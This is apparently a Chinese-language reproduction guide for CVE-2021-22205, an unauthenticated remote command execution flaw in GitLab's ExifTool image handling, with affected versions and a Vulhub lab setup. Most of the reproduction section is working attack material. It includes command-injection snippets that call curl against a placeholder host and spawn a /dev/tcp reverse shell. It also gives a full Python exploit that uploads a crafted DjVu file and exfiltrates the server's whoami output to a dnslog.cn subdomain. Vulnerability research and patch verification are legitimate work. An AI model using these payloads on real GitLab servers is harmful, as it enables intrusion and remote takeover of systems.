# CVE-2021-22205：GitLab命令执行漏洞
## 漏洞概述

2021年4⽉15⽇，GitLab官方发布安全补丁更新修复了GitLab命令执行漏洞（CVE-2021- 22205）。由于GitLab中的ExifTool没有对传⼊的图像文件的扩展名进行正确处理，攻击者通过 上传特制的恶意图片，可以在目标服务器上执行任意命令，且发现由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用，社区版(CE)和企业版(EE)皆受影响，CVSS评分为9.9。

 GitLab 是一个基于 Web 的 DevOps 生命周期工具，它提供了一个 Git 存储库管理器，可提供 wiki、问题跟踪以及持续集成和部署管道功能。

在 GitLab CE/EE 中发现了一个问题，影响了从 11.9 开始的版本。GitLab 没有正确验证传递给文件解析器的图像文件，这导致了未经身份验证的远程命令执行。

## 漏洞影响
11.9 <= Gitlab CE/EE < 13.8.8
13.9 <= Gitlab CE/EE < 13.9.6
13.10 <= Gitlab CE/EE < 13.10.3

## 漏洞环境
Vulhub:~/vulhub/gitlab/CVE-2021-22205

`docker-compose up -d`

## 漏洞复现
验证POC，需可连通的dnslog.cn
### 命令执行
开启一个服务器
`python3 -m http.server 80`

`command = 'curl http://x.x.x.x'
. qx{"+  command +"} .`
### 反弹shell
`reverseShell = "echo '/bin/bash -i >& /dev/tcp/{listenIp}/{listenPort} 0>&1' > /tmp/shell.sh && chmod 777 /tmp/shell.sh && /bin/bash /tmp/shell.sh"
. qx{"+  reverseShell +"} .
`
### Dnslog
```python
'''
只用于验证CVE-2021-22205，不需bs4
Uasges：python cve-2021-22205.py -u http://xx.xx.xx.xx
'''
import requests,argparse,re

def check(target_url):
	session = requests.Session()
	flag = 'Failed to process image'
	data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{curl `whoami`.2oi2n4.dnslog.cn} . \\\n\" b \") )                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"

	p = '<meta name="csrf-token" content="(.*)" />'

	try:
		req1 = session.get(target_url.strip("/") + "/users/sign_in", verify=False)
		token = re.search(p,req1.text).group(1)

		headers = {
    		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
			"Connection": "close",
			"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
			"X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}

		req2 = session.post(target_url.strip("/") + "/uploads/user", data=data, headers=headers, verify=False)

		if flag in req2.text:
			print("[+] 目标 {} 存在漏洞".format(target_url))
		else:
			print("[-] 目标 {} 不存在漏洞".format(target_url))
	except Exception as e:
		print(e)

def main():
    parser = argparse.ArgumentParser(description='GitLab < 13.10.3 RCE')
    parser.add_argument('-u', '--url', type=str, help=' 目标URL ')

    args = parser.parse_args()

    target_url   = args.url

    check(target_url)

if __name__ == '__main__':
    main()
```

## 参考文章
https://github.com/Al1ex/CVE-2021-22205
https://zhuanlan.zhihu.com/p/439476986
